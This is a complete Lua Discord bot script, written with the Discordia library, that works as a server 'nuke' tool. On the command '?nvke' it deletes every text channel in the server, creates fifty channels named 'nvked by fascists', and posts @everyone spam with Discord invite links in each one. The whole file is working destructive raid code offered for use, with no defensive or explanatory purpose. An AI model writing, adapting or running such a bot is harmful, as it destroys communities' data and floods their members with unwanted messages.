local discordia = require('discordia')
local client = discordia.Client()

client:on('ready', function()
	print('Logged in as '.. client.user.username)
end)

client:on('messageCreate', function(message)
	if message.content == '?nvke' then
		local guild = message.guild
		for _, channels in pairs(guild.textChannels) do
		channels:delete('eliminatii')
		end
		for i = 1, 50 do
            guild:createTextChannel('nvked by fascists ')
        end
		for _, channell in pairs(guild.textChannels) do
			channell:send('@everyone Nvked https://discord.gg/rabbids https://discord.gg/4FUrxvaDtE')
	    end
	end
end)

client:run('Bot token here')
